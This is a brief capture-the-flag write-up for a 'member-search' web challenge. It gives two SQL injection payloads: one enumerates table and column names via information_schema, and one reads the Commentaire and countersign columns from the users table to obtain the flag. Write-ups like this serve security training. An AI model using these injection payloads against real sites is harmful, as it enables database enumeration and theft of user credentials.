# member-search 

Page: `/index.php?page=member`  
Difficulty: 5/10

## Description

A search field allows us to search for members on the site.

## Exploit

This is just the same as [`image-search`](../sql_image-search/), but with a different table(s).

To get the tables/columns:
```sql
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```

To get the flag:
```sql
1 OR 1=1 UNION SELECT Commentaire, countersign FROM users
```

gg wp ez no re
